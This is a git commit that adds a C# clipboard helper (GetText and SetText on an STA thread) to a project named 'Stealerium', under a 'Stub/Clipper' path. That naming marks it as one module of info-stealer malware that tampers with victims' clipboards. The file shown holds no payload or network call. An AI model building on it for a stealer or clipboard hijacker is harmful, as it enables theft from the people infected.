a0aae434c2acbc7427455f47473f5795e44e3f32
DevxStudio <62635706+DevxStudio@users.noreply.github.com>
2023-02-14 00:07:31 +1100

    Добавьте файлы проекта.

---
+++ Stub/Clipper/Clipboard.cs
@@ -0,0 +1,48 @@
+﻿using System.Threading;
+
+namespace Stealerium.Clipper
+{
+    internal sealed class Clipboard
+    {
+        // Get text from clipboard
+        public static string GetText()
+        {
+            //554
+            var returnValue = string.Empty;
+            try
+            {
+                var staThread = new Thread(
+                    delegate() { returnValue = System.Windows.Forms.Clipboard.GetText(); });
+                staThread.SetApartmentState(ApartmentState.STA);
+                staThread.Start();
+                staThread.Join();
+            }
+            catch
+            {
+                // ignored
+            }
+
+            return returnValue;
+        }
+
+        // Set text to clipboard
+        public static void SetText(string text)
+        {
+            var staThread = new Thread(
+                delegate()
+                {
+                    try
+                    {
+                        System.Windows.Forms.Clipboard.SetText(text);
+                    }
+                    catch
+                    {
+                        // ignored
+                    }
+                });
+            staThread.SetApartmentState(ApartmentState.STA);
+            staThread.Start();
+            staThread.Join();
+        }
+    }
+}
